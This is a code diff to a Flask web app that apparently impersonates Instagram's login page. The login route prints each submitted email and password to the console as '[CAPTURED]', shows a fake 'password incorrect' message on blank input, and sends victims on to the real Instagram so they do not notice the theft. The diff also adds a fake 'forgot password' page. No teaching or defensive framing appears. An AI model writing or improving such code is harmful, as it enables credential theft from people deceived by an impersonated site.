@@ -1,9 +1,6 @@
-from flask import Flask, request, render_template, redirect, url_for
+from flask import Flask, request, render_template, redirect
 
 app = Flask(__name__)
-
-# Store a simple "fake error" flag
-error_message = ""
 
 @app.route('/')
 def index():
@@ -20,13 +17,17 @@ def login():
 
     print(f"[CAPTURED] Email: {email}, Password: {password}")
 
-    # OPTIONAL: Add fake error if input looks wrong
+    # Fake error if blank
     if email.strip() == "" or password.strip() == "":
         error = "Sorry, your password was incorrect. Please double-check your password."
         return render_template('index.html', error=error)
 
-    # If looks fine, redirect to Instagram
+    # Redirect to real Instagram
     return redirect("https://www.instagram.com/")
+
+@app.route('/forgot')
+def forgot():
+    return render_template('forgot.html')
 
 if __name__ == "__main__":
     app.run()
